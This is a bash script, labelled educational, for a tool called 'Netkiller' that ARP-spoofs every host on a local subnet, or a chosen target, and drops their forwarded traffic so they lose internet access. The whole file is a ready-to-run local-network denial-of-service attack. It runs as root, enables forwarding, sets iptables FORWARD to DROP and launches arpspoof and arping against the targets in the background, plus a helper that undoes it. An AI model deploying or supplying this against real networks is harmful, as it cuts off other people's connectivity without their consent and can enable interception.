#!/bin/bash

# ARP Spoofing Internet Blocker (Educational Purposes Only)
# Requires: arpspoof, iptables, ipcalc, and root privilege

# Check if script is running as root
if [[ $EUID -ne 0 ]]; then
    exec sudo "$0" "$@"
fi

# Current Network Config
WLAN=$(ip link show | awk -F': ' '/^[0-9]+: wl/{print $2}' | head -n 1)
GW=$(ip route show dev "$WLAN" | awk '/default/ {print $3}')
MASK=$(ip addr show "$WLAN" | grep 'inet ' | awk '{print $2}')
IP=$(ip addr show "$WLAN" | awk '/inet / {print $2}' | cut -d/ -f1)

echo "Current Network Configuration"
echo "INTERFACE: | $WLAN"
echo "GATEWAY:   | $GW"
echo "YOUR IP:   | $IP"
echo "TARGETS:   | $MASK"
echo ""

# Detect Interface
echo "Enter Wireless Interface: Skip for default"
read -r -p "> $WLAN " WLN
INTERFACE="${WLN:-$WLAN}"
echo ""

# Detect Gateway IP
echo "Enter Router Gateway IP: Skip for default"
read -r -p "> $GW " INET
GATEWAY="${INET:-$GW}"
echo ""

# Detect Subnet
echo "Enter Subnet Mask: Skip for default"
read -r -p "> $MASK " IPS
TARGET_IPS="${IPS:-$MASK}"
echo ""

# Detect Device IP
echo "Enter Device IP: Skip for default"
read -r -p "> $IP " DEVIP
MYIP="${DEVIP:-$IP}"
echo ""

# Prompt configuration
echo "Your Arpspoof Configurations..."
echo ""
echo "INTERFACE: | $INTERFACE"
echo "GATEWAY:   | $GATEWAY"
echo "DEVICE IP: | $MYIP"
echo "TARGETS:   | $TARGET_IPS"
echo ""

# Enable IP Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Remove Iptables rules
cat > /bin/netkiller-stop << 'EOF'
#!/bin/sh

echo "" 
echo "Netkiller is Stopped!" 
iptables -t nat -F
iptables -P FORWARD ACCEPT 
iptables -F FORWARD
pkill -f arpspoof
pkill -f arping
sleep 3s
echo "" 
echo "Restoring the connection..."
echo "" 
EOF
chmod 755 /bin/netkiller-stop

# iptables policy 
iptables -P FORWARD DROP

# Function to expand a subnet to individual IPs (using ipcalc)
expand_subnet() {
    SUBNET=$1
    IFS='/' read -r IP MASK <<< "$SUBNET"
    ipcalc -n -b "$SUBNET" | awk '/HostMin/ {start=$2} /HostMax/ {end=$2} END {if(start && end) print start, end}'
}

ip2int() { 
    local a b c d
    IFS=. read -r a b c d <<< "$1"
    echo "$((a*256**3 + b*256**2 + c*256 + d))" 
}

int2ip() { 
    local ip=$1
    echo "$((ip>>24&255)).$((ip>>16&255)).$((ip>>8&255)).$((ip&255))" 
}

for TARGET in $TARGET_IPS; do
    if [[ "$TARGET" =~ / ]]; then
        # Expand subnet for ARP spoofing
        read -r HOSTMIN HOSTMAX < <(expand_subnet "$TARGET")
        if [[ -n "$HOSTMIN" && -n "$HOSTMAX" ]]; then
            # Convert IPs to integers
            START=$(ip2int "$HOSTMIN")
            END=$(ip2int "$HOSTMAX")
            for ((i=START; i<=END; i++)); do
                TARGET_IP=$(int2ip "$i")
                # Block all the traffic except the device ip and gateway (bidirectional)
                iptables -I FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP
                iptables -I FORWARD -s "$GATEWAY" ! -d "$MYIP" -j DROP
                (
                    arpspoof -i "$INTERFACE" -t "$TARGET_IP" -r "$GATEWAY" >/dev/null 2>&1 &
                    arping -b -A -i "$INTERFACE" -S "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 &
                ) &
            done
        fi
    else
        # Blocking traffic for Single IP
        iptables -I FORWARD ! -s "$TARGET" -d "$GATEWAY" -j DROP
        iptables -I FORWARD -s "$GATEWAY" ! -d "$TARGET" -j DROP

        # Bidirectional Arp Spoofing policy
        (   
            arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 &
            arping -b -A -i "$INTERFACE" -S "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
        ) &
    fi
done
echo "Netkiller Attack is running in the background..."
echo ""
echo "To stop, run: sudo netkiller-stop"
echo ""
